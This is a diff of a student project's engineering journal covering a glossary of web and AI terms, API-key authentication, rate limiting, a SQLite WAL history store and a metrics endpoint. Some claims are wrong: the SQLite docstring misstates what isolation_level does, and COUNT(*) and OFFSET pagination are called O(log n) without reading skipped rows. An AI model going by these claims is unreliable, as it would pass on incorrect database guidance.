+A Python data validation library. You define schemas as Python classes with type annotations. Pydantic automatically validates incoming data and raises clear errors for invalid inputs.  
+```python
+class ClassifyRequest(BaseModel):
+    tta: bool = False
+```
+If the client sends `{"tta": "maybe"}`, Pydantic raises `ValidationError: tta: value is not a valid boolean`. FastAPI converts this to a 422 HTTP response with a clear error message — your code never even runs.
+
+---
+
+**Prometheus**  
+An open-source monitoring system. Collects metrics from your application by scraping the `/api/metrics` endpoint (which returns plain-text key-value pairs in Prometheus format).  
+Example metric output:
+```
+deepcoin_requests_total{route="/api/classify"} 42
+deepcoin_inference_ms_avg 847.3
+deepcoin_active_sessions 3
+```
+Grafana connects to Prometheus and turns these numbers into dashboards with graphs.
+
+---
+
+**Rate Limiting**  
+Restricting how many requests a client can make in a time window.  
+Our limit: 10 requests per minute on `/api/classify` per IP address.  
+Why: the CNN inference takes 0.5-20 seconds. Without rate limiting, 100 users simultaneously uploading coins would queue 100 analyses, and the server would run out of memory.
+
+---
+
+**REST (Representational State Transfer)**  
+An architectural style for HTTP APIs using standard HTTP verbs:
+- `GET` — read data (no side effects)
+- `POST` — create data or trigger an action
+- `PUT` — replace a resource completely
+- `PATCH` — update part of a resource
+- `DELETE` — remove a resource  
+REST is "stateless" — each request must contain all information needed to process it (no "session" state on the server between requests).
+
+---
+
+**Uvicorn**  
+An ASGI web server that runs our FastAPI application. Handles incoming TCP connections, parses HTTP/1.1 and HTTP/2, and calls our FastAPI app for each request.  
+Start command: `uvicorn src.api.main:app --host 0.0.0.0 --port 8000`
+
+---
+
+**WebSocket**  
+A persistent, bidirectional TCP connection between browser and server. Unlike HTTP (request-response, connection closes after each exchange), WebSockets stay open and either side can send messages at any time.  
+Next.js development server uses WebSockets for HMR (Hot Module Replacement) — instantly updating the browser when you save a file.
+
+---
+
+### Part 5 — RAG and AI Agents
+
+---
+
+**Agent**  
+A software component that can take autonomous actions based on inputs. In LangGraph, each node in the graph is an "agent" that receives the current state, does its work, and writes results back to the state.  
+Our 5 agents: Gatekeeper (orchestrator), Historian (narrative), Investigator (visual analysis), Validator (forensic), Synthesis (report generation).
+
+---
+
+**ChromaDB**  
+A local vector database. Stores documents as embedding vectors and enables fast nearest-neighbor search ("find the 5 documents most similar to this query vector").  
+Local = runs in your process (no separate server needed). Persists to disk. The `chroma_db_rag/` directory is the database — backing it up preserves all 47,705 vectors.
+
+---
+
+**Embedding**  
+Converting text (or images) into a fixed-size vector of numbers that captures semantic meaning.  
+`"silver coin from Thrace"` → 384-dimensional vector `[0.12, -0.45, 0.78, ...]`  
+Two semantically similar texts produce similar vectors (close in cosine distance). "Thracian silver drachm" and "silver coin from Thrace" would have vectors ~0.92 cosine similarity even though the words are different.  
+We use `all-MiniLM-L6-v2` (22MB model) to generate 384-dim text embeddings entirely on CPU.
+
+---
+
+**Graceful Degradation**  
+The principle that when a component fails, the system provides reduced (but still useful) functionality instead of completely failing.  
+Example: if the Gemini API is unavailable, the Historian falls back to concatenating KB fields directly into the PDF — no beautiful prose, but all the factual data is still present. The report is generated. The user gets an answer.
+
+---
+
+**Hallucination**  
+When an LLM generates text that is factually incorrect but sounds plausible. An LLM might say "this coin was minted under Emperor Augustus in 27 BC" even if the coin is from a completely different era — because that sounds like the kind of sentence that appears in numismatic texts.  
+Our RAG approach prevents hallucination on structured facts: the Gemini prompt includes all factual data as `[CONTEXT N]` blocks and instructs "do not add any fact not present in these contexts."
+
+---
+
+**LangGraph**  
+A library for building stateful agent pipelines as directed graphs. Nodes are functions (agents). Edges are connections between agents. Conditional edges direct flow based on state values.  
+Why LangGraph instead of function chaining: supports conditional routing, graph cycles (retry), explicit state management, per-node error handling.
+
+---
+
+**LLM (Large Language Model)**  
+A neural network trained on vast amounts of text that can generate coherent, contextually appropriate text. Examples: Gemini 2.5 Flash, GPT-4, Llama 3.  
+In our system: Gemini writes the historical narrative for historian output. It does not determine the facts — those come from the KB. Gemini only provides the prose quality.
+
+---
+
+**Ollama**  
+A tool for running open-source LLMs locally on your own GPU. Instead of sending data to Google/OpenAI servers, the model runs entirely on your RTX 3050 Ti.  
+Models we use: `gemma3:4b` for text (4 billion parameters, fits in 4.3 GB VRAM), `qwen3-vl:4b` for vision (VLM, not yet downloaded).  
+Benefit: free, private, no API rate limits.  
+Drawback: slower than cloud APIs (~4-8 seconds per response vs ~1-2 seconds for Gemini API).
+
+---
+
+**RAG (Retrieval-Augmented Generation)**  
+A technique that grounds LLM output in factual retrieved data.  
+Without RAG: `Gemini("write about coin type 1015")` → may hallucinate.  
+With RAG: `retrieve facts from KB → inject as [CONTEXT 1-5] → Gemini("using ONLY these facts, write about coin type 1015")` → grounded prose, no invented facts.  
+Three steps: Retrieve → Augment the prompt → Generate from the augmented prompt.
+
+---
+
+**RRF (Reciprocal Rank Fusion)**  
+A score merging formula for combining results from multiple search systems.  
+`score(d) = Σ(1 / (60 + rank_r(d)))` where `rank_r(d)` is document d's rank in result list r.  
+Example: document in position 1 of BM25 AND position 3 of vector search:  
+`score = 1/(60+1) + 1/(60+3) = 0.01639 + 0.01587 = 0.03226`  
+A document in position 50 of BM25 only:  
+`score = 1/(60+50) = 0.00909`  
+The constant 60 in the denominator prevents the top few results from dominating completely. Documents that rank moderately in multiple systems beat documents that rank highly in only one system.
+
+---
+
+**Semantic Search**  
+Finding documents based on meaning rather than exact keyword matching.  
+`"silver coin from northern Greece"` can return results for "Thracian drachm" with high similarity even though neither "silver", "coin", "northern", nor "Greece" appears in the document — because the embedding vectors are close in vector space.
+
+---
+
+**State Machine**  
+A system that has a defined set of states and transitions between them based on inputs or conditions.  
+Our LangGraph pipeline is a state machine:
+- States: `{image_loaded}`, `{cnn_done}`, `{route_decided}`, `{agent_done}`, `{synthesis_done}`
+- Transitions: `image_loaded → run_cnn → cnn_done → decide_route → route_decided → run_agent`
+- Conditional transition: `if conf > 0.85 → historian_node`, else if `conf > 0.40 → validator_node`, else `investigator_node`
+
+---
+
+**VLM (Vision-Language Model)**  
+A neural network that can process both images and text. Given an image, it can write a description in natural language, answer questions about what it sees, or extract structured attributes.  
+`qwen3-vl:4b` is our planned VLM via Ollama. Used by the Investigator agent for unknown/low-confidence coins.  
+When not available, the Investigator falls back to OpenCV HSV analysis.
+
+---
+
+### Part 6 — Frontend and TypeScript
+
+---
+
+**App Router (Next.js 15)**  
+The current (2024+) directory-based routing system in Next.js. Every `page.tsx` file in `app/` automatically becomes a route.  
+`app/page.tsx` → `/`  
+`app/history/page.tsx` → `/history`  
+`app/history/[id]/page.tsx` → `/history/any-id-here`  
+The brackets `[id]` create a dynamic route. The `id` value is passed to the component as `params.id`.
+
+---
+
+**AbortController**  
+A browser API for canceling in-flight HTTP requests.  
+```javascript
+const controller = new AbortController();
+axios.post("/api/classify", data, { signal: controller.signal });
+// Later:
+controller.abort();  // cancels the request, the server also sees the connection close
+```
+We give the `controller` to the Cancel button in `CoinUploader` so clicking it actually cancels the classify request, not just hides a loading spinner.
+
+---
+
+**Axios**  
+An HTTP client for JavaScript. We use it instead of the browser's native `fetch()` because Axios:
+- Automatically serializes/deserializes JSON
+- Has request/response interceptors (middleware for HTTP calls)
+- Handles `timeout` configuration cleanly
+- Works in both browser and Node.js environments
+
+---
+
+**CVA (Class Variance Authority)**  
+A utility for creating type-safe component variants in Tailwind CSS.  
+```typescript
+const buttonVariants = cva("base-classes", {
+  variants: {
+    variant: { default: "bg-blue", destructive: "bg-red" },
+    size: { sm: "text-sm", lg: "text-lg" }
+  }
+})
+```
+Instead of writing `className={isDestructive ? "bg-red px-4" : "bg-blue px-4"}` everywhere, you write `className={buttonVariants({ variant: "destructive", size: "sm" })}`.
+
+---
+
+**Framer Motion**  
+A React animation library. Declarative animations:
+```tsx
+<motion.div
+  initial={{ opacity: 0, y: -20 }}    // starting state
+  animate={{ opacity: 1, y: 0 }}       // target state
+  exit={{ opacity: 0 }}                // when removed from DOM
+  transition={{ duration: 0.3 }}
+>
+```
+We use it for: hero fade-in, confidence bar animations, AgentPipeline particle beams, coin-flip header, AnimatePresence transitions when switching between upload/result views.
+
+---
+
+**Hydration**  
+The process of attaching React's JavaScript event handlers to HTML that was pre-rendered on the server.  
+In Next.js Server Components, the HTML arrives fully rendered. The browser "hydrates" it by running React code and making interactive elements (buttons, inputs) actually work.  
+Hydration errors occur when the server-rendered HTML and the client-side React's expected HTML differ (e.g., `Math.random()` in render — server and client produce different values).
+
+---
+
+**Next.js**  
+A React framework that adds:
+- Server-Side Rendering (SSR): HTML generated on the server, not the browser
+- Static Site Generation (SSG): HTML generated at build time
+- API Routes: backend code in `app/api/` directories
+- App Router: directory-based routing
+- Image optimization, font optimization, code splitting  
+We use App Router (Next.js 15) with TypeScript.
+
+---
+
+**React Query (TanStack Query)**  
+A library for managing server-state in React applications. Instead of `useState + useEffect + fetch`, you use `useQuery` and `useMutation`.  
+Benefits:
+- Automatic caching (same query doesn't re-fetch if data is fresh)
+- `invalidateQueries(['history'])` after delete — forces history list to re-fetch immediately
+- Loading/error states built-in
+- Retry on failure built-in
+
+---
+
+**Server Component vs Client Component**  
+- **Server Component** (default in Next.js 15): Rendered on the server. Can `await` directly. Cannot use `useState`, event handlers, or browser APIs. Good for data fetching.
+- **Client Component** (`"use client"` directive at top): Rendered in the browser. Can use hooks, event handlers. Hydrated from server-rendered HTML.  
+`CoinUploader.tsx`, `AgentPipeline.tsx`, `AnalysisPanel.tsx` are all Client Components (they have event handlers and state).
+
+---
+
+**Suspense**  
+A React component that shows a fallback UI while async operations are in progress.  
+```tsx
+<Suspense fallback={<Spinner />}>
+  <AsyncComponent />   // might not be ready yet
+</Suspense>
+```
+In Next.js App Router, pages that read URL search params with `useSearchParams()` MUST be wrapped in `<Suspense>` because `useSearchParams()` is a Client Component hook that can only run in the browser.
+
+---
+
+**Tailwind CSS**  
+A utility-first CSS framework. Instead of writing custom CSS classes, you apply pre-defined utility classes directly in JSX:
+```tsx
+<div className="flex items-center gap-4 rounded-lg bg-navy-900 p-4 text-white">
+```
+Each class does exactly one thing (`flex`, `items-center`, `gap-4`, etc.). No custom CSS files needed. Tailwind v4 uses `@import "tailwindcss"` instead of `@tailwind base/components/utilities`.
+
+---
+
+**TypeScript**  
+JavaScript with static type checking. You declare the types of all variables, function parameters, and return values. The TypeScript compiler catches type errors before you run the code.  
+```typescript
+function getConfidence(result: ClassifyResponse): number {
+  return result.cnn.confidence;   // TypeScript knows this is a number
+}
+getConfidence("hello")  // TypeScript ERROR: string is not ClassifyResponse
+```
+`strict: true` mode in our `tsconfig.json` enables the strictest type checking.
+
+---
+
+**Zustand**  
+A minimal React state management library. Compared to Redux: much simpler, no boilerplate, same power for our use case.  
+```typescript
+const store = create((set) => ({
+  isLoading: false,
+  result: null,
+  setResult: (r) => set({ result: r }),
+}))
+// In any component:
+const isLoading = useStore(s => s.isLoading);   // reactive: re-renders when isLoading changes
+```
+
+---
+
+### Part 7 — Infrastructure and DevOps
+
+---
+
+**BM25 (Best Match 25)**  
+A keyword-based text ranking algorithm. Scores how relevant document d is to query q based on how often query terms appear in d (weighted by term rarity across all documents).  
+`BM25Okapi` from `rank-bm25` builds an inverted index over all chunk texts at startup. Query "silver Thrace": finds all chunks containing "silver" OR "Thrace", scores by term frequency × inverse document frequency.  
+Complementary to vector search: exact keyword matches ("coin 1015") may have poor vector similarity but high BM25 score. RRF merges both signals.
+
+---
+
+**Docker**  
+A system for packaging an application and ALL its dependencies into a portable container. The container runs identically on any machine that has Docker installed, regardless of the host OS.  
+A Docker container is like a tiny virtual machine, but lighter: instead of a full OS, it shares the host OS kernel and only includes libraries + application code.
+
+---
+
+**Docker Compose**  
+A tool for defining and running multi-container applications. The `docker-compose.yml` file declares all 7 services with their images, volumes, environment variables, and dependencies. `docker compose up` starts them all.  
+`depends_on: postgres: condition: service_healthy` ensures the FastAPI container waits for PostgreSQL to be fully ready before starting.
+
+---
+
+**GitHub Actions**  
+A CI/CD (Continuous Integration / Continuous Deployment) platform built into GitHub. When code is pushed, GitHub automatically runs workflows defined in `.github/workflows/*.yml`.  
+Our planned CI: on every push, run `pytest`, `flake8`, `black --check`. If any fails, the push is marked as failing and deployment is blocked.
+
+---
+
+**Nginx**  
+A high-performance web server and reverse proxy. In our Docker setup: listens on port 80, routes `/api/*` requests to FastAPI (port 8000), and routes everything else to Next.js (port 3000). Users only see port 80 (or 443 for HTTPS). The backend ports (8000, 3000) never need to be exposed publicly.
+
+---
+
+**Redis**  
+An in-memory key-value store. Extremely fast (sub-millisecond reads/writes) because everything lives in RAM.  
+Planned use in Layer 6:
+- Cache: `classify(image_hash)` result cached for 1 hour. Identical images return instantly.
+- Future: Celery job queue for long-running asynchronous tasks.
+
+---
+
+**Reverse Proxy**  
+A server that sits in front of backend servers and forwards client requests to them. Benefits:
+- Single entry point (port 80/443) instead of multiple backend ports
+- SSL termination (handle HTTPS at the proxy, forward plain HTTP internally)
+- Load balancing (distribute requests across multiple backend instances)
+- Static file serving (Nginx serves images/PDFs faster than FastAPI)
+
+---
+
+**Virtual Environment (venv)**  
+An isolated Python installation for one specific project. Python packages installed inside `venv/` are completely separate from other projects and the system Python.  
+Activate: `& C:\Users\Administrator\deepcoin\venv\Scripts\Activate.ps1`  
+After activation, `python` and `pip` refer to the venv's versions, not the system's.  
+If the venv is deleted: recreate with `python -m venv venv`, then reinstall requirements.
+
+---
+
+**WAL (Write-Ahead Log)**  
+A database journaling technique. Before modifying the actual database file, write the intended change to a separate log file first. If the system crashes mid-write, the database can reconstruct the correct state from the log on restart.  
+`PRAGMA journal_mode=WAL` in SQLite: enables multiple concurrent readers (important for FastAPI with multiple worker threads) while maintaining write safety.
+
+---
+
+
 
 ## 19. Phase 9 — Inference Engine (Layer 1)
 
@@ -3042,7 +5285,7 @@ The difference is not cosmetic. It is the difference between a student project a
 
 ---
 
-## Section 23 — Commit c5b7f0d: qwen3-vl:4b activated + think-tag fix (February 28, 2026)
+## Section 22b — Commit c5b7f0d: qwen3-vl:4b Activated + Think-Tag Fix (February 28, 2026)
 
 ### What happened
 User pulled `qwen3-vl:4b` via Ollama. `.env` already had `OLLAMA_HOST` and `OLLAMA_VISION_MODEL=qwen3-vl:4b` configured — Investigator switched from OpenCV fallback to real vision LLM immediately.
@@ -3551,6 +5794,870 @@ Smoke tests: health 200 all-ok, classify type-1015 91.1% historian 21.5s, histor
 ---
 
 *End of Engineering Journal — Layer 4 original FastAPI build.*
+
+---
+
+## 24. Layer 4 Phase 2 — X-API-Key Authentication
+
+**Date**: Late February 2026  
+**Commit**: Part of `1b210ef`  
+**File created**: `src/api/auth.py` (later renamed to `auth_legacy.py` when JWT auth was added in Phase A2)
+
+---
+
+### Why Authentication Is Needed Even in a Student Project
+
+Before adding any auth, the `/api/classify` endpoint was completely open. Any person, any bot, or any automated scanner could send thousands of requests — each one:
+
+1. Loading the 79 MB EfficientNet-B3 model GPU weights (already loaded — not the issue)
+2. Running 8 TTA forward passes on the GPU (~560 ms)
+3. Calling the Ollama LLM or GitHub Models API (8–120 seconds)
+4. Writing a 3 MB PDF to disk
+
+Without rate limiting or authentication, a single malicious actor could:
+- Burn through the GitHub Models free quota (1,500 requests/day) in minutes
+- Monopolise the GPU semaphore, blocking all legitimate requests
+- Fill the disk with PDFs at ~3 MB each: 1,000 requests = 3 GB in minutes
+
+**For a PFE presented to an academic jury reviewing a live demo, this is unacceptable.** The demo system must not be exploitable during the presentation.
+
+The design decision: **X-API-Key authentication** as the first layer, before JWT. Why this order?
+
+- X-API-Key is machine-to-machine auth: a single secret header. Zero login flow, zero user database, zero token expiry management.
+- It protects the API immediately with ~20 lines of code.
+- It is appropriate for a single-user PFE system where the only "users" are: (a) the developer (us), (b) the Next.js frontend, (c) the academic jury examining the demo.
+- JWT auth (register/login/refresh) comes in Phase A2 when a multi-user scenario is needed.
+
+---
+
+### The Auth Module: `src/api/auth.py`
+
+```python
+"""
+src/api/auth.py — X-API-Key header authentication dependency.
+
+WHY: Machine-to-machine auth layer. The frontend and any external caller must include
+     the X-API-Key header to access protected endpoints. Key is compared with constant-
+     time comparison to prevent timing-based key enumeration attacks.
+
+HOW: FastAPI dependency injection via Depends(require_api_key). Routes that need
+     protection add `_: None = Depends(require_api_key)` as a function parameter.
+     FastAPI calls the dependency before the route handler; if it raises HTTPException,
+     the route never runs.
+"""
+import hmac, os
+from fastapi import HTTPException, Security, status
+from fastapi.security import APIKeyHeader
+
+_KEY_HEADER_SCHEME = APIKeyHeader(name="X-API-Key", auto_error=False)
+
+def require_api_key(key: str | None = Security(_KEY_HEADER_SCHEME)) -> None:
+    """
+    FastAPI dependency: validate the X-API-Key header.
+
+    Behaviour:
+    - If DEEPCOIN_API_KEY env var is NOT set → development mode passthrough
+      (no key required). This means local development works with zero configuration.
+    - If DEEPCOIN_API_KEY IS set → the caller must include header 'X-API-Key: <token>'.
+      Mismatch raises HTTP 401 Unauthorized.
+
+    Security note: uses hmac.compare_digest() not == to prevent timing side-channel.
+    """
+    expected = os.getenv("DEEPCOIN_API_KEY")
+    if not expected:
+        return          # dev-mode passthrough: API_KEY not configured → no auth required
+    if not key or not hmac.compare_digest(key, expected):
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Invalid or missing X-API-Key header.",
+            headers={"WWW-Authenticate": "ApiKey"},
+        )
+```
+
+---
+
+### Why `hmac.compare_digest` Instead of `==`
+
+This is not just style — it is a **security requirement**.
+
+**The timing attack:**  
+Python's `==` operator compares strings character by character and returns `False` as soon as it finds the first mismatch. This means:
+- A wrong key `"a..."` that differs at position 0 takes ~50 nanoseconds to fail.
+- A wrong key `"correct_prefix_x..."` that matches the first 20 characters before differing takes ~1 microsecond to fail.
+- An attacker sends thousands of keys and measures response times — the key that produces slightly longer responses is a better match. Repeat until the full key is recovered.
+
+This is a **timing side-channel attack** and it has been used in practice against deployed systems.
+
+**`hmac.compare_digest`** always compares all bytes of both strings regardless of where they differ. It takes constant time. The attacker's timing measurements return no information about how many characters matched.
+
+**For a student project** where the API key might be a 32-character hex string, this attack is theoretically viable over a network with microsecond-level timing resolution. Including `hmac.compare_digest` adds zero complexity and eliminates the vulnerability permanently.
+
+---
+
+### Applying the Dependency to Routes
+
+```python
+# src/api/routes/classify.py
+from src.api.auth import require_api_key
+from fastapi import Depends
+
+@router.post("/classify")
+async def classify_coin(
+    file  : UploadFile,
+    tta   : bool = Query(True),
+    _auth : None = Depends(require_api_key),   # ← auth guard
+):
+    ...
+
+# src/api/routes/history.py
+@router.delete("/history/{record_id}", status_code=204)
+async def delete_history_item(
+    record_id : str,
+    _auth     : None = Depends(require_api_key),   # ← only delete requires auth
+):
+    ...
+```
+
+**Why `_auth: None` (underscore prefix)?**  
+The dependency does not return a useful value — it either passes silently (returns `None`) or raises an exception. The `_auth` naming convention signals to Python static analysers and readers that this parameter is intentionally unused in the function body. Without the `_` prefix, some linters would warn "unused parameter `auth`".
+
+**Why NOT protect GET /history?**  
+GET history is read-only. A leaked history response reveals past analysis results (coin types and confidence scores) but does not enable abuse (no LLM calls, no GPU usage, no disk writes). In a single-user PFE system this is an acceptable trade-off. If privacy were a concern, history would also require auth.
+
+---
+
+### Dev-Mode Passthrough Logic
+
+```python
+expected = os.getenv("DEEPCOIN_API_KEY")
+if not expected:
+    return   # no key configured → pass through
+```
+
+**Why this pattern is safe and necessary:**
+
+During development, running the API with `uvicorn src.api.main:app --reload` requires no environment configuration. You run the server, open the browser, and it works. Requiring `X-API-Key` in dev mode would mean every developer adding this project must also configure a local key — adding friction with zero security benefit (the localhost server is not internet-accessible).
+
+In production (Docker deployment), `DEEPCOIN_API_KEY=<random-hex>` is set. The passthrough does NOT fire. The check is enforced.
+
+This is the correct pattern for **environment-sensitive security**: development is open, production is locked.
+
+---
+
+## 25. Layer 4 Phase 2 — Rate Limiting (SlowAPI) + SQLite WAL Store + Metrics Endpoint
+
+**Date**: Late February 2026  
+**Commit**: Part of `1b210ef`  
+**Files created/modified**: `src/api/limiter.py`, `src/api/_store.py` (rewritten), `src/api/main.py` (metrics added)
+
+---
+
+### A. Rate Limiting with SlowAPI
+
+#### Why a Separate File For the Limiter
+
+```python
+# src/api/limiter.py
+"""
+Rate-limiting singleton using slowapi.
+
+WHY a separate file (not inlined in main.py):
+FastAPI's startup runs before route imports in some configurations.
+If limiter is created inside main.py and routes try to import it,
+Python may hit a circular import:
+  main.py imports routes → routes import limiter from main → circular.
+
+Keeping limiter in its own module breaks the cycle:
+  main.py imports limiter → routes import limiter → no cycle.
+"""
+from slowapi import Limiter
+from slowapi.util import get_remote_address
+
+limiter = Limiter(key_func=get_remote_address)
+```
+
+`key_func=get_remote_address` means the rate limit is **per source IP address**. Each IP gets its own bucket of 10 requests/minute for the classify endpoint. A second IP address gets a fresh bucket.
+
+**Why `get_remote_address` and not per-user?**  
+In Phase 1 (before JWT auth), there are no user accounts. The only sensible granularity is IP. When JWT is added (Phase A2), this can be upgraded to `get_remote_user` using the JWT claims — but per-IP is correct for now.
+
+---
+
+#### Registering SlowAPI with FastAPI
+
+```python
+# src/api/main.py
+from slowapi import _rate_limit_exceeded_handler
+from slowapi.errors import RateLimitExceeded
+from src.api.limiter import limiter
+
+app.state.limiter = limiter
+app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
+```
+
+Two steps:
+1. Store the limiter on `app.state` — SlowAPI reads it from `request.state.limiter` internally. This avoids a global variable accessible from routes.
+2. Register the exception handler for `RateLimitExceeded` — this transforms SlowAPI's internal exception into a proper HTTP 429 response with a `Retry-After` header.
+
+**What the client receives on rate limit hit:**
+```
+HTTP 429 Too Many Requests
+Content-Type: application/json
+Retry-After: 60
+{
+  "error": "Rate limit exceeded: 10 per 1 minute"
+}
+```
+
+---
+
+#### Applying the Rate Limit to Classify
+
+```python
+# src/api/routes/classify.py
+from src.api.limiter import limiter
+from fastapi import Request
+
+@router.post("/classify")
+@limiter.limit("10/minute")          # ← global limit: 10 requests / minute / IP
+async def classify_coin(
+    request : Request,               # ← SlowAPI needs request to read the source IP
+    file    : UploadFile,
+    tta     : bool = Query(True),
+    _auth   : None = Depends(require_api_key),
+):
+    ...
+```
+
+**Why only `/api/classify` is rate-limited:**
+
+| Endpoint | Rate-limited? | Reason |
+|----------|--------------|--------|
+| `POST /api/classify` | **Yes** | GPU + LLM call, 8–120 seconds per request |
+| `GET /api/health` | No | Instant check, no resources used |
+| `GET /api/history` | No | SQL read, < 1 ms |
+| `GET /api/history/{id}` | No | SQL read, < 1 ms |
+| `DELETE /api/history/{id}` | No | SQL write, < 1 ms |
+| `GET /api/metrics` | No | Counter read, microseconds |
+| `GET /api/reports/{filename}` | No | File serve, no AI resources |
+
+The 10/minute limit was chosen empirically:
+- Each classify call takes 8–120 seconds (depending on LLM provider)
+- 10 calls/minute = one call every 6 seconds maximum
+- The GPU can only run one inference at a time (semaphore)
+- Legitimate interactive use (a museum curator uploading 10 coins/minute) is fine
+- Abusive scripted use (hundreds/minute) is blocked
+
+---
+
+### B. SQLite WAL Store: from JSON to a Real Database
+
+#### Why the Original JSON Store Was a Problem
+
+The original `_store.py` (from commit `7055768`) stored history as a simple JSON file:
+
+```python
+# ORIGINAL _store.py — simple but fragile
+import json, pathlib
+
+STORE_PATH = pathlib.Path("data/history.json")
+
+def _load() -> list[dict]:
+    if not STORE_PATH.exists():
+        return []
+    return json.loads(STORE_PATH.read_text())
+
+def append(record: dict) -> None:
+    data = _load()
+    data.append(record)
+    STORE_PATH.write_text(json.dumps(data, indent=2))
+```
+
+**Problem 1 — Race condition:**
+If two HTTP requests finish within the same millisecond:
+1. Request A calls `_load()` → reads the file → gets current list
+2. Request B calls `_load()` → reads the file → gets the same current list
+3. Request A appends its record and writes the file
+4. Request B appends its record and writes the file ← **OVERWRITES Request A's record**
+
+This is a classic **read-modify-write race condition** (TOCTOU: Time-of-Check-Time-of-Use). On a busy server with concurrent requests it silently loses history records. No error, no warning — records just disappear.
+
+**Problem 2 — O(n) everything:**
+Loading the JSON file to append ONE record reads ALL past records into memory first. At 10,000 history records, a classify call deserialises 10,000 JSON objects, appends one, serialises 10,001 objects to disk. Time: O(n). Memory: O(n). For a growing history, each classify call gets slower as history grows.
+
+**Problem 3 — No pagination support:**
+`GET /api/history?page=2` required loading ALL history into memory and slicing in Python. At 10,000 records this is 100 MB of deserialized dicts just to return 20 rows.
+
+---
+
+#### The SQLite WAL Solution
+
+```python
+# REWRITTEN _store.py — SQLite with WAL mode
+import sqlite3, json, threading, pathlib
+
+DB_PATH    = pathlib.Path("data/history.db")
+_STORE_LOCK = threading.Lock()     # protects all write operations at Python level
+
+def _get_conn() -> sqlite3.Connection:
+    """
+    Open (or reuse) the SQLite connection.
+    WAL mode: Write-Ahead Log — supports concurrent readers with one writer.
+    isolation_level=None: autocommit off; we manage transactions explicitly.
+    check_same_thread=False: we protect access with _STORE_LOCK instead.
+    """
+    conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
+    conn.execute("PRAGMA journal_mode=WAL")       # enables WAL
+    conn.execute("PRAGMA synchronous=NORMAL")     # safe + fast (not FULL)
+    return conn
+
+def ensure_store() -> None:
+    """
+    Create the classifications table and index if they don't exist.
+    Called once at FastAPI lifespan startup.
+    """
+    with _STORE_LOCK:
+        conn = _get_conn()
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS classifications (
+                id        TEXT PRIMARY KEY,
+                timestamp TEXT NOT NULL,
+                payload   TEXT NOT NULL          -- full ClassifyResponse as JSON string
+            )
+        """)
+        conn.execute("""
+            CREATE INDEX IF NOT EXISTS idx_timestamp
+            ON classifications (timestamp DESC)  -- speeds ORDER BY timestamp DESC
+        """)
+        conn.commit()
+```
+
+**Why WAL mode (Write-Ahead Log)?**
+
+SQLite has two journal modes:
+- **DELETE (default)**: Before any write, SQLite writes the original data to a separate journal file, then modifies the main DB file. Readers are blocked until the write completes.
+- **WAL (Write-Ahead Log)**: New writes go FIRST to a `.wal` file (the log). Readers continue reading the main DB file (which still has the old data). The log is checkpointed (merged into the main DB) periodically. Readers never wait for writers.
+
+In our API:
+- Health check, history list, history detail = **readers** (can run concurrently)
+- Classify result save = **writer** (one at a time via Semaphore anyway)
+- With WAL: a history GET never blocks waiting for a classify POST to finish writing
+
+**Why Python-level `threading.Lock` PLUS SQLite's internal WAL?**
+
+SQLite WAL handles OS-level concurrent file access. The Python `_STORE_LOCK` handles concurrent Python threads trying to write simultaneously. They defend at different layers:
+
+SQLite WAL: `thread A (writing) ↔ file system ↔ thread B (reading)` — OS file-level protection  
+`_STORE_LOCK`: `thread A (writing) → Python lock → other Python threads queue up` — prevents multiple write transactions from racing at the Python level
+
+Without `_STORE_LOCK`, two classify threads could both call `conn.execute("INSERT ...", ...)` simultaneously, triggering SQLite's internal `SQLITE_BUSY` error (returned when two writers compete). The Python lock prevents them from even trying simultaneously.
+
+---
+
+#### SQL Operations: O(log n) by Design
+
+**Append (INSERT):**
+```python
+def append(record: dict) -> None:
+    with _STORE_LOCK:
+        conn = _get_conn()
+        conn.execute(
+            "INSERT INTO classifications (id, timestamp, payload) VALUES (?, ?, ?)",
+            (record["id"], record["timestamp"], json.dumps(record)),
+        )
+        conn.commit()   # this single-row write is O(log n) B-tree insertion
+```
+SQLite's B-tree index on `(id TEXT PRIMARY KEY)` makes INSERT O(log n) regardless of total record count. At 100,000 records: ~17 comparisons to find the right leaf node.
+
+**Count (O(log n)):**
+```python
+def count() -> int:
+    """SELECT COUNT(*) reads only the B-tree index metadata — never reads row data."""
+    with _get_conn() as conn:
+        row = conn.execute("SELECT COUNT(*) FROM classifications").fetchone()
+        return row[0] if row else 0
+```
+
+**Paginated list (O(log n + k)):**
+```python
+def load_page(skip: int = 0, limit: int = 20) -> list[dict]:
+    """
+    Only the requested rows are touched on disk.
+    ORDER BY timestamp DESC: uses the idx_timestamp index.
+    LIMIT ? OFFSET ?: returns exactly `limit` rows starting at position `skip`.
+    """
+    with _get_conn() as conn:
+        rows = conn.execute(
+            "SELECT payload FROM classifications ORDER BY timestamp DESC LIMIT ? OFFSET ?",
+            (limit, skip),
+        ).fetchall()
+    return [json.loads(r[0]) for r in rows]
+```
+
+At 10,000 records, requesting page 500 (rows 9,980–10,000): SQLite traverses the index to the 9,980th position and reads exactly 20 rows. The previous 9,980 rows are never read from disk.
+
+---
+
+### C. The `/api/metrics` Endpoint
+
+```python
+# src/api/main.py
+_metrics = {
+    "total_requests"  : 0,
+    "successful_runs" : 0,
+    "failed_runs"     : 0,
+    "historian_count" : 0,
+    "validator_count" : 0,
+    "investigator_count": 0,
+}
+
+@app.get("/api/metrics", dependencies=[Depends(require_api_key)])
+async def metrics() -> PlainTextResponse:
+    """
+    Prometheus-format metrics endpoint.
+    Protected by API key (production operator access only).
+    """
+    lines = [
+        "# HELP deepcoin_requests_total Total classify requests received",
+        f"deepcoin_requests_total {_metrics['total_requests']}",
+        "# HELP deepcoin_runs_successful Classify calls that returned a result",
+        f"deepcoin_runs_successful {_metrics['successful_runs']}",
+        "# HELP deepcoin_runs_failed Classify calls that raised an exception",
+        f"deepcoin_runs_failed {_metrics['failed_runs']}",
+        "# HELP deepcoin_route_historian Analyses routed to historian agent",
+        f"deepcoin_route_historian {_metrics['historian_count']}",
+        "# HELP deepcoin_route_validator Analyses routed to validator agent",
+        f"deepcoin_route_validator {_metrics['validator_count']}",
+        "# HELP deepcoin_route_investigator Analyses routed to investigator agent",
+        f"deepcoin_route_investigator {_metrics['investigator_count']}",
+        f"deepcoin_db_records {count()}",   # live SQLite count
+    ]
+    return PlainTextResponse("\n".join(lines) + "\n")
+```
+
+**Prometheus format (text exposition format):**
